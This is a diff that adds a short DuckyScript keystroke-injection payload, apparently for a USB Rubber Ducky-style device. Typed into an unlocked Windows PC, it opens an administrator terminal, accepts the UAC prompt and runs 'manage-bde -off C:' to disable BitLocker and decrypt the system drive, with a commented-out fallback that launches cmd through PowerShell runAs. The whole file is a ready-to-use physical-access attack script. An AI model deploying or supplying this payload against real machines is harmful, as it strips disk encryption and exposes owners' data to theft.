@@ -1,0 +1,32 @@
+REM Turn off bitlocker on C:
+REM This will begin decrypting the drive. When drive is fully decrypted, the protectors will also be removed.
+
+REM Author: emptythevoid
+
+REM Launch command prompt using GUI x (Windows 11-only, but more reliable
+GUI x
+DELAY 200
+STRING A
+DELAY 1000
+ALT y
+DELAY 3000
+
+REM Launch command prompt using GUI r. More compatible, less reliable
+REM GUI r
+REM DELAY 500
+REM STRING powershell Start-Process cmd -Verb runAs
+REM ENTER
+REM DELAY 3000
+REM ALT y
+REM DELAY 500
+
+REM Turn off bitlocker on C:
+STRING manage-bde -off C:
+ENTER
+DELAY 500
+
+REM may need this if using traditional command prompt
+REM ALT F4
+
+STRING exit
+ENTER
